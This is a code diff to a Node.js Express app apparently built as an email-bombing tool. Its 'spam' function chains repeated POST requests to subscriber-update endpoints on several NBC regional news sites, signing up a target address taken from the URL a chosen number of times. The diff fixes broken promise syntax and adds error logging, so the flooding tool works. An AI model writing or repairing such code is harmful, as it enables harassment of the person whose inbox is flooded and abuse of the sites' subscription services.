@@ -142,7 +142,7 @@ function spam(theemail, encodedEmail, path){
                 "method": "POST",
                 "mode": "cors"
             });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbcbayarea.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -160,7 +160,7 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbcboston.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -178,7 +178,7 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbcchicago.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -196,7 +196,7 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbcconnecticut.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -214,7 +214,7 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbcdfw.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -232,7 +232,7 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbclosangeles.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -250,7 +250,7 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbcmiami.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -268,7 +268,7 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }.then(function(response){
+    }).then(function(response){
         return fetch("https://www.nbcnewyork.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
             "headers": {
                 "accept": "application/json, */*;q=0.1",
@@ -340,16 +340,21 @@ function spam(theemail, encodedEmail, path){
             "method": "POST",
             "mode": "cors"
         });
-    }).catch(function() {
+    }).catch(function(e) {
         errs++;
+        fs.promises.readFile(path + '/errmessages.txt', 'utf-8')
+        .then((data) => {
+        fs.writeFileSync(path + '/errmessages.txt', data + e + "\n");
+        });
     }).then(function(response){
         num++;
         fs.writeFileSync(path + '/num.txt', num.toString());
         fs.writeFileSync(path + '/errs.txt', errs.toString());
-    });    
+    });      
 }
 app.use(express.static("static"));
 app.get('/sendMail/:id1/:id2/index.html', (req, res) => {
+    try{
     errs = 0;
     num = 0;
     const id1 = atob(req.params.id1);
@@ -361,10 +366,14 @@ app.get('/sendMail/:id1/:id2/index.html', (req, res) => {
     createDirectory(__dirname + "/sendMail/" + req.params.id1);
     createDirectory(__dirname + "/sendMail/" + req.params.id1 + "/" + req.params.id2);
     fs.writeFileSync(__dirname + req.url.slice(0, req.url.length - 11) + '/num.txt', "Loading...");
+    fs.writeFileSync(__dirname + req.url.slice(0, req.url.length - 11) + '/errmessages.txt', "");
     for(var i = 0; i < times; i++){
     spam(theemail, encodedEmail, __dirname + req.url.slice(0, req.url.length - 11));
     }
     res.sendFile(__dirname + '/spamPages/spam.html');
+} catch(e){
+    res.status(500).send("Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" + e);
+}
 });
 app.get('/sendMail/:id1/:id2/:id3', (req, res) => {
     res.sendFile(__dirname + req.url);
